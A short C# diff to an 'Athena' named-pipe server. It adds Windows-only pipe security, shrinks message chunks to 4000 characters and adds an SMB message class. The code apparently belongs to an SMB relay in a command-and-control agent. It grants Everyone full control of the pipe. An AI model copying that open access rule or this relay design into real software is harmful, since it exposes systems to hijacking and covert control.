@@ -61,10 +61,15 @@ namespace Athena
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
+            {
+#pragma warning disable CA1416
+                var pipeSec = new PipeSecurity();
+                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
+                this.serverPipe.SetPipeSecurity(pipeSec);
+#pragma warning restore CA1416
+            }
 
-            var pipeSec = new PipeSecurity();
-            pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid,null), PipeAccessRights.FullControl, AccessControlType.Allow));
-            this.serverPipe.SetPipeSecurity(pipeSec);
             this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
@@ -167,7 +172,7 @@ namespace Athena
                     final = false
                 };
 
-                IEnumerable<string> parts = json.SplitByLength(65000);
+                IEnumerable<string> parts = json.SplitByLength(4000);
 
                 //hunk the message and send the parts
                 Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
@@ -224,5 +229,12 @@ namespace Athena
 
             return String.Empty;
         }
+    }
+    class SmbMessage
+    {
+        public string uuid;
+        public string message;
+        public int chunks;
+        public int chunk;
     }
 }
